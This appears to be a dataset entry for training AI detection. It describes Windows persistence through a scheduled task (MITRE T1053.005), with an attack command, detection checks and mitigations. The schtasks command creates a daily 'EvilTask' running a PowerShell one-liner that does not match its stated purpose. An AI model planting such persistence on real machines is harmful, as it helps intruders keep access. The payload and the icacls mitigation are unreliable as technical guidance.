---
type: campaign
scenario_id: 2
tactic: Persistence
technique: "T1053.005: Scheduled Task/Job"
technique_id: T1053.005
tags: [campaign, lotl, persistence]
---

# Creating persistent scheduled task using schtasks to run malicious script.

## Threat Description
Creating persistent scheduled task using schtasks to run malicious script.

## Attack Command
```
schtasks /create /tn EvilTask /tr "powershell -c 'I$(for($i=0;$i-lt100;$i++){$r+=([char](65+($i%26)))})$r'" /sc daily /st 00:00
```

## Detection Logic
Audit scheduled tasks: `schtasks /query | findstr EvilTask`; Monitor for abnormal task names with high-entropy strings.

## Mitigation
Restrict task creation: `icacls %windir%\System32\Tasks /inheritance:r`; Monitor Task Scheduler logs: Event ID 4698.

## AI Training Prompt
Train AI to detect suspicious scheduled tasks and suggest access control restrictions.

## References
- MITRE ATT&CK T1053.005: https://attack.mitre.org/techniques/T1053/005/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
